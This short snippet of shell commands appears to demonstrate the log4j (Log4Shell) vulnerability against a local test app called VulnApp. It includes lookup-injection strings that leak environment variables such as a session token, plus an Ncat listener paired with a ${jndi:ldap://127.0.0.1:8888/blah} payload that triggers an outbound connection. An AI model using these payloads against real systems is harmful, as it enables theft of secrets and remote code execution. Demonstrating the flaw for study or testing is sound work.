java VulnApp.java "Hello there"

# Trigger log4j to printout local variable
java VulnApp.java "Username is ${env:USER}"
java VulnApp.java "Token is ${env:TEMPORARY_SESSION_TOKEN}"

# Trigger log4j to create network connection using Ncat
ncat -k -vv -c "echo ---CONNECTION [%NCAT_REMOTE_PORT]--- 1>&2" -l 8888
java VulnApp.java ${jndi:ldap://127.0.0.1:8888/blah}